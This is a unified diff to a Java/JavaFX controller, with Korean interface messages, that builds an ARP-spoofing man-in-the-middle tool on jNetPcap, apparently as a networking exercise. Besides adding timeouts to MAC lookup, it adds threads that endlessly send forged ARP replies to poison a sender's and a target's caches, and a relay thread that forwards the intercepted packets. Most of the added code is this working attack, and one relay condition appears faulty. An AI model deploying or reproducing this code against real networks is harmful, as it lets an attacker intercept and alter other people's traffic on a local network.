@@ -1,7 +1,6 @@
 package controller;
 
 import java.io.IOException;
-import java.net.Inet4Address;
 import java.net.InetAddress;
 import java.net.URL;
 import java.nio.ByteBuffer;
@@ -16,7 +15,9 @@ import org.jnetpcap.nio.JMemory;
 import org.jnetpcap.packet.JRegistry;
 import org.jnetpcap.packet.PcapPacket;
 import org.jnetpcap.protocol.lan.Ethernet;
+import org.jnetpcap.protocol.network.Ip4;
 
+import javafx.application.Platform;
 import javafx.collections.FXCollections;
 import javafx.collections.ObservableList;
 import javafx.fxml.FXML;
@@ -129,9 +130,13 @@ public class Controller implements Initializable {
 			System.out.println(Main.pcap.getErr());
 		}
 		textArea.appendText("타겟에게 ARP Request를 보냈습니다. \n" + Util.bytesToString(arp.getPacket()) + "\n");
-		
+		long targetStartTime = System.currentTimeMillis();
 		Main.targetMAC = new byte[6];
 		while (Main.pcap.nextEx(header, buf) == Pcap.NEXT_EX_OK) {
+			if(System.currentTimeMillis() - targetStartTime >= 500) {
+				textArea.appendText("타겟이 응답하지 않습니다.\n");
+				break;
+			}
 			PcapPacket packet = new PcapPacket(header, buf);
 			packet.scan(id);
 			byte[] sourceIP = new byte[4];
@@ -156,9 +161,13 @@ public class Controller implements Initializable {
 			System.out.println(Main.pcap.getErr());
 		}
 		textArea.appendText("센더에게 ARP Request를 보냈습니다. \n" + Util.bytesToString(arp.getPacket()) + "\n");
-		
+		long senderStartTime = System.currentTimeMillis();
 		Main.senderMAC = new byte[6];
 		while (Main.pcap.nextEx(header, buf) == Pcap.NEXT_EX_OK) {
+			if(System.currentTimeMillis() - senderStartTime >= 500) {
+				textArea.appendText("센더가 응답하지 않습니다.\n");
+				break;
+			}
 			PcapPacket packet = new PcapPacket(header, buf);
 			packet.scan(id);
 			byte[] sourceIP = new byte[4];
@@ -172,8 +181,99 @@ public class Controller implements Initializable {
 			} else {
 				continue;
 			}
+			
 		}
 		
 		textArea.appendText("센더 맥 주소: " + Util.bytesToString(Main.senderMAC) + "\n");
+		new SenderARPSpoofing().start();
+		new TargetARPSpoofing().start();
+		new ARPRelay().start();
+			
+	}
+	class SenderARPSpoofing extends Thread{
+		@Override
+		public void run(){
+			ARP arp = new ARP();
+			arp.makeARPReply(Main.senderMAC, Main.myMac, Main.myMac, Main.targetIP, Main.senderMAC, Main.senderIP);
+			Platform.runLater(() -> {
+				textArea.appendText("센더에게 감염된 ARP Reply 패킷을 계속 전송합니다.\n");
+			});
+			while(true){
+				ByteBuffer buffer = ByteBuffer.wrap(arp.getPacket());
+				Main.pcap.sendPacket(buffer);
+				try {
+					Thread.sleep(200);
+				} catch (InterruptedException e){
+					e.printStackTrace();
+				}
+			}
+		}
+	}
+	class TargetARPSpoofing extends Thread{
+		@Override
+		public void run(){
+			ARP arp = new ARP();
+			arp.makeARPReply(Main.targetMAC, Main.myMac, Main.myMac, Main.senderIP, Main.targetMAC, Main.targetIP);
+			Platform.runLater(() -> {
+				textArea.appendText("타켓에게 감염된 ARP Reply 패킷을 계속 전송합니다.\n");
+			});
+			while(true){
+				ByteBuffer buffer = ByteBuffer.wrap(arp.getPacket());
+				Main.pcap.sendPacket(buffer);
+				try {
+					Thread.sleep(200);
+				} catch (InterruptedException e){
+					e.printStackTrace();
+				}
+			}
+		}
+	}
+	class ARPRelay extends Thread {
+		@Override
+		public void run() {
+			Ip4 ip = new Ip4();
+			PcapHeader header = new PcapHeader(JMemory.POINTER);
+			JBuffer buf = new JBuffer(JMemory.POINTER);
+			Platform.runLater(() -> {
+				textArea.appendText("ARP Relay를 진행합니다.\n");
+			});
+			
+			while (Main.pcap.nextEx(header, buf) != Pcap.NEXT_EX_NOT_OK) {
+				PcapPacket packet = new PcapPacket(header, buf);
+				int id = JRegistry.mapDLTToId(Main.pcap.datalink());
+				packet.scan(id);
+				
+				byte[] data = packet.getByteArray(0, packet.size());
+				byte[] tempDestinationMAC = new byte[6];
+				byte[] tempSourceMAC = new byte[6];
+				System.arraycopy(data, 0, tempDestinationMAC, 0, 6);
+				System.arraycopy(data, 6, tempSourceMAC, 0, 6);
+				
+				if(Util.bytesToString(tempDestinationMAC).equals(Util.bytesToString(Main.myMac)) &&
+						Util.bytesToString(tempSourceMAC).equals(Util.bytesToString(Main.myMac))) {
+					if(packet.hasHeader(ip)){
+						if(Util.bytesToString(ip.source()).equals(Util.bytesToString(Main.myIP))){
+							System.arraycopy(Main.targetMAC, 0, data, 0, 6);
+							System.arraycopy(Main.myMac, 0, data, 6, 6);
+							ByteBuffer buffer = ByteBuffer.wrap(data);
+							Main.pcap.sendPacket(buffer);
+						}
+					}
+				}
+				
+				else if(Util.bytesToString(tempDestinationMAC).equals(Util.bytesToString(Main.myMac))&&
+						Util.bytesToString(tempSourceMAC).equals(Util.bytesToString(Main.targetMAC))){
+					if(packet.hasHeader(ip)){
+						if(Util.bytesToString(ip.destination()).equals(Util.bytesToString(Main.senderIP))){
+							System.arraycopy(Main.senderMAC, 0, data, 0, 6);
+							System.arraycopy(Main.myMac, 0, data, 6, 6);
+							ByteBuffer buffer = ByteBuffer.wrap(data);
+							Main.pcap.sendPacket(buffer);
+						}
+					}
+				}
+				System.out.println(Util.bytesToString(buf.getByteArray(0, buf.size())));
+			}
+		}
 	}
 }
